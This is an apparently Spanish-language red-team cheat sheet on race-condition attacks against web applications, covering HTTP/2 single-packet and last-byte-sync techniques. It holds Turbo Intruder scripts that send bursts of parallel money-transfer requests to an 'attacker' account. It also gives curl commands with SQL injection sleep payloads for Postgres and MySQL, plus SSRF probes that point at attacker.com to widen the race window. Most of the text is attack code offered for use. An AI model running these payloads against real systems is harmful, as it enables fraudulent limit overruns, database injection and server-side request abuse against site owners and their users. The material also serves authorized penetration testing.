---
aliases:
  - Single-Packet Attack
  - Last-Byte Sync
  - HTTP/2 Race
tags:
  - vuln/race-condition
  - technique/initial-access
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Race Conditions]]"
---
# Race Conditions - Single-Packet Attack

---

## HTTP/2 Single-Packet Technique

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp Repeater → tab HTTP/2 → group requests → "Send group in parallel (single connection)" | Multiplex HTTP/2 streams en single TCP packet | Endpoint con HTTP/2. |
| Turbo Intruder script con `engine=Engine.BURP2, concurrentConnections=1` (ver code block) | HTTP/2 single-packet automation | Volume race testing. |
| `curlc --http2 -X POST -d '{"k":"v"}' https://target/api/x` × N en parallel via background subshell | Manual H2 test | Quick CLI variant. |
| `curl -sI https://target -o /dev/null -w '%{http_version}\n'` | Verifica si endpoint usa HTTP/2 | Pre-attack check. |
| Post-race: comparar latencia 1 request vs N concurrent | Si latencia ~igual → packet único confirmado | Validation. |
| Sleep gadget canary: inject `?q=' OR pg_sleep(5)-- -` en single request, race antes de sleep complete | Confirma race window enlarged | Side-channel timing test. |
^race-single-h2

### Turbo Intruder script HTTP/2 single-packet

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)  # HTTP/2 single-packet
    
    req = '''POST /api/transfer HTTP/2
host: target.com
content-type: application/json
cookie: session=...
content-length: 50

{"to":"attacker","amount":1000}'''
    
    for _ in range(20):
        engine.queue(req)

def handleResponse(req, interesting):
    table.add(req)
```

---

## Last-Byte Sync (HTTP/1.1)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Turbo Intruder con `engine=Engine.THREADED, concurrentConnections=1` y manual byte-flush | Last-byte sync HTTP/1.1 | Endpoint H1 only. |
| Burp Repeater group "Send in single connection" sin H2 | Pipelining manual approximado | Less precise que H2. |
| `curl --http1.1 -X POST ...` × N pipelined en single conn (custom script) | Manual H1 race | Legacy targets. |
| `curl -sI https://target \| grep -i 'HTTP/'` | Verificar version HTTP soportada | Discovery. |
| Comparar `time` de 1 request vs N concurrent | Detectar race timing window | Calibration. |
^race-single-lastbyte

---

## Pre-Loading Delays

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Send 1 GET request "warm" antes del burst | Pre-warm caches + DB connections | Reduce jitter. |
| `curl -sI https://target/x > /dev/null && sleep 0.1 && [BURST]` | Sleep buffer entre warm y burst | Network stability. |
| Turbo Intruder script con `engine.queue(warmup_req); engine.queue(real_req)` × N | Phased warm + race | Built-in. |
| `for i in {1..3}; do curl -sI https://target/api/x > /dev/null; done; sleep 0.5; [parallel burst]` | Triple warm + delay | Cold start avoidance. |
| Si serverless (Lambda): `curl https://target/init` antes del race | Force cold start handling | Lambda apps. |
| TLS session resumption: usar mismo curl session con `--cookie-jar /tmp/c -b /tmp/c` | TLS reuse reduce handshake time | Connection-level prep. |
^race-single-prewarm

---

## Sleep Gadget Probe

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl "https://target/search?q=A%27%20OR%20pg_sleep(5)--%20-"` | SQLi sleep en Postgres → enlarge race window | Postgres backend. |
| `curl "https://target/search?q=A%27%20OR%20SLEEP(5)--%20-"` | SQLi sleep en MySQL | MySQL backend. |
| `curl "https://target/api/url?fetch=https://attacker.com/slow"` (atacante sirve slow response) | SSRF sleep gadget | App con SSRF + outbound. |
| `curl "https://target/api/url?fetch=http://attacker.com:81"` (port no-respondiendo) | Timeout-based sleep | Connection-level delay. |
| Upload archivo grande (1GB) en endpoint upload → race trigger en otra parallel request | Inherent sleep via processing | Heavy file upload race. |
| Trigger image resize endpoint con large image | Image processing sleep | Resize pipeline race. |
^race-single-sleep

### Workflow combine sleep gadget + race

```python
# Probe with sleep gadget
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)

    # Trigger sleep via SQLi
    sleep_req = '''GET /search?q=AAA' OR pg_sleep(5)-- - HTTP/2
host: target.com

'''
    
    # Race con limit overrun
    race_req = '''POST /api/transfer HTTP/2
host: target.com
content-type: application/json

{"to":"attacker","amount":1000}'''
    
    engine.queue(sleep_req)
    for _ in range(10):
        engine.queue(race_req)
```

---
